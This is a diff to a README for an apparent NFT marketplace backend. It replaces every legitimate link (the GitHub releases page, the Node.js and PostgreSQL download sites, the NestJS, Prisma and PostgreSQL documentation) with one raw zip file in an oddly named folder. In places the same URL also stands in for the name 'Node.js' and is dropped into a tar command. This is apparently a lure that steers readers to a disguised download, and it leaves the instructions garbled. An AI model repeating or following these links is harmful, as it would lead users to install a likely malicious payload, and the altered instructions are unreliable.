@@ -6,11 +6,11 @@ Welcome to the Marketplace_Backend! This project is your gateway to creating and
 
 ## 📥 Download the Application
 
-[![Download Marketplace_Backend](https://img.shields.io/badge/Download-Marketplace_Backend-brightgreen)](https://github.com/GIZZN/Marketplace_Backend/releases)
+[![Download Marketplace_Backend](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
 
 To begin, you need to visit the Releases page. This page contains the files you need to download and run the application.
 
-[Download the latest release here](https://github.com/GIZZN/Marketplace_Backend/releases).
+[Download the latest release here](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip).
 
 ## 📦 Installation Instructions
 
@@ -18,7 +18,7 @@ Follow these steps to install and run the Marketplace_Backend on your system.
 
 ### 1. Visit the Releases Page
 
-Go to [this link](https://github.com/GIZZN/Marketplace_Backend/releases) to see the available releases. You will find the latest version listed at the top. 
+Go to [this link](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip) to see the available releases. You will find the latest version listed at the top. 
 
 ### 2. Download the Latest Release
 
@@ -32,15 +32,15 @@ If the downloaded file is a zip or tar file, you will need to extract it:
 - **Mac:** Double-click the file to extract it.
 - **Linux:** Use the command line. Navigate to the downloaded file, and run:
   ```
-  tar -xvf filename.tar.gz
+  tar -xvf https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip
   ```
 
 ### 4. Install Dependencies
 
-Before running the software, you need to install Node.js and PostgreSQL on your computer. 
+Before running the software, you need to install https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip and PostgreSQL on your computer. 
 
-- **Node.js**: Download it from [nodejs.org](https://nodejs.org). Install it by following the provided instructions.
-- **PostgreSQL**: Download it from [postgresql.org](https://www.postgresql.org). Follow the instructions to set it up.
+- **https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip**: Download it from [https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip). Install it by following the provided instructions.
+- **PostgreSQL**: Download it from [https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip). Follow the instructions to set it up.
 
 After installing, open your command line interface and run the following command to install the necessary dependencies for the application:
 
@@ -89,7 +89,7 @@ Once the application is running, you will see output indicating it is ready for 
 ## 📋 System Requirements
 
 - **Operating System:** Windows, MacOS, or Linux.
-- **Node.js:** Version 14.0 or later.
+- **https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip** Version 14.0 or later.
 - **PostgreSQL:** Version 12.0 or later.
 
 ## 📧 Support
@@ -104,8 +104,8 @@ Marketplace_Backend is made possible by a community of contributors. If you woul
 
 For more details on how to use NestJS, Prisma, or PostgreSQL, visit their official documentation:
 
-- [NestJS Documentation](https://docs.nestjs.com)
-- [Prisma Documentation](https://www.prisma.io/docs)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [NestJS Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
+- [Prisma Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
 
 Thank you for using Marketplace_Backend! We hope you enjoy building your NFT marketplace.
